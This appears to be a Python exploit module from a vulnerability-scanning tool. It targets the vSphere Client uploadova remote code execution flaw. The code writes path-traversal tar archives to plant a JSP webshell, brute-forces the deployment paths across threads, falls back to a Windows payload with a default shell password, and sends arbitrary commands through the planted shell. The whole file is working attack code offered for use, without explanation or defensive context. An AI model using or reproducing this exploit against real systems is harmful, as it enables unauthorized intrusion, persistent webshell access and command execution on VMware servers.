# -*- coding:utf-8 -*-
# vSphere Client RCE
import os
import re

from VulnScanModel.models import VulnScan
from . import vsphere_rce_poc
from .. import fileUtil

import tarfile
import time
import threading

# set headers
from ..requestClass import Requests

headers = {}
headers[
    "User-Agent"
] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
headers["Cache-Control"] = "no-cache"
headers["Pragma"] = "no-cache"
shell_name = "passer_W.jsp"

vuln_path = "/ui/vropspluginui/rest/services/uploadova"
SM_TEMPLATE = b"""<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>"""
windows_payload = "payload/Windows.tar"
linux_shell_path = f"/ui/resources/{shell_name}"
windows_shell_path = f"/statsreport/shell.jsp"


def make_traversal_path(path, level=2):
    traversal = ".." + "/"
    fullpath = traversal * level + path
    return fullpath.replace("\\", "/").replace("//", "/")

class Test(threading.Thread):
    def __init__(self, url, count, requestUtil):
        threading.Thread.__init__(self)
        self.url = url
        self.count = count
        self.path = f"/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{self.count}/0/h5ngc.war/resources/{shell_name}"
        self.tar_file = os.getcwd() + "/vulscan_Project/%s/%s" % ("temp", f"{self.count}.tar")
        self.result = False
        self.requestUtil = requestUtil

    def run(self):
        archive(self.tar_file, os.getcwd() + "/vulscan_Project/webshell/zs.jsp", self.path)
        resp = self.requestUtil.post(self.url + vuln_path, header=headers, files={"uploadFile": open(self.tar_file, "rb")}, shell=True)
        if "success" == resp.text.lower():
            print(f"[+]{self.tar_file.split('/')[-1]} is uploaded success")
            self.result = True
            os.remove(self.tar_file)

    def get_result(self):
        return self.result




def archive(tar_file, file, path):
    tarf = tarfile.open(tar_file, "w")
    fullpath = make_traversal_path(path, level=2)
    tarf.add(file, fullpath)
    tarf.close()




def burp(burp_list):
    for b in burp_list:
        b.start()
    for b in burp_list:
        b.join()

class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def checkShellExist(self, url, type="linux"):
        time.sleep(5)
        if type == "linux":
            re = self.requestUtil.get(url + linux_shell_path)
        else:
            re = self.requestUtil.get(url + windows_shell_path)
        if re.status_code != 404:
            return True
        else:
            return False

    def uploadWindowsPayload(self, URL):
        file = {"uploadFile": open(windows_payload, "rb")}
        re = self.requestUtil.post(
            URL + vuln_path, files=file, header=headers, shell=True
        )
        if "SUCCESS" in re.text:
            if self.checkShellExist(URL + windows_shell_path):
                print(
                    "[+] Shell exist URL: {url}, default password:rebeyond".format(
                        url=URL + windows_payload
                    )
                )
            else:
                print("[-] All payload has been upload but not success.")
        else:
            print("[-] All payload has been upload but not success.")

    def rce(self, shell_url, cmd):
        print(shell_url)
        resp = self.requestUtil.get(shell_url + f"?i={cmd}")
        return resp.content.replace(b'\x00', b'').decode()

    def exp(self, cmd, content=""):
        vuln = self.vuln
        url = self.vuln.url.strip("/")
        shell_path = ""
        if not shell_name in vuln.specify:
            test = Test(url, 1, self.requestUtil)
            test.run()
            if not test.get_result():
                self.uploadWindowsPayload(url)
                if self.checkShellExist(url, "windows"):
                    shell_path = windows_shell_path
            else:
                upload_list = []
                for i in range(2, 120):
                    upload_list.append(Test(url, i, self.requestUtil))
                    if len(upload_list) % 30 == 0:
                        burp(upload_list)
                        upload_list = []
                        if self.checkShellExist(url):
                            print("\033[31m[+]shell upload success\033[00m")
                            break
                        else:
                            print("\033[31m[-]shell is not uploaded\033[00m")
                burp(upload_list)
                if self.checkShellExist(url):
                    shell_path = linux_shell_path
            if shell_path == "":
                return ""
            vuln.specify = shell_path
            vuln.save()
        result = f"shell上传成功, shell地址: \n{url}{vuln.specify}\n输出结果: \n%s" % self.rce(url + vuln.specify, cmd)
        return result
